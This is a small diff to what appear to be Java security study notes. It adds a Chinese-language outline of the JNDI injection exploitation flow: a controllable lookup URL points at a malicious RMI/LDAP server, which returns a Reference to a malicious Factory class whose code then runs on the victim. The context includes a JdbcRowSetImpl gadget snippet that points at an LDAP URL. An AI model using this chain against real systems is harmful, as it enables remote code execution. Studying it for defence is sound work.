@@ -140,6 +140,12 @@ JdbcRowSetImpl
 JdbcRowSetImpl rs = new JdbcRowSetImpl();
 rs.setDataSourceName("ldap://127.0.0.1:2333/test");
 Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");
+
+jndi注入利用流程
+1.当客户端程序中调用了InitialContext.lookup(url),并且url可以被输入控制指向精心构造好的rmi服务地址/ldap服务
+2.恶意的rmi服务会向受攻击的客户端返回一个Refernce,用于获取恶意的Factory类
+3.当客户端执行了lookup()时，会对恶意的Factory类进行加载并实例化，通过factory.getObjectInstance()获取外部远程对象实例
+4.攻击者在Factory类文件的构造方法，静态代码块，getObjectInstance()方法等处写入恶意代码，达到远程代码执行效果。
 ```
 
 HashMap
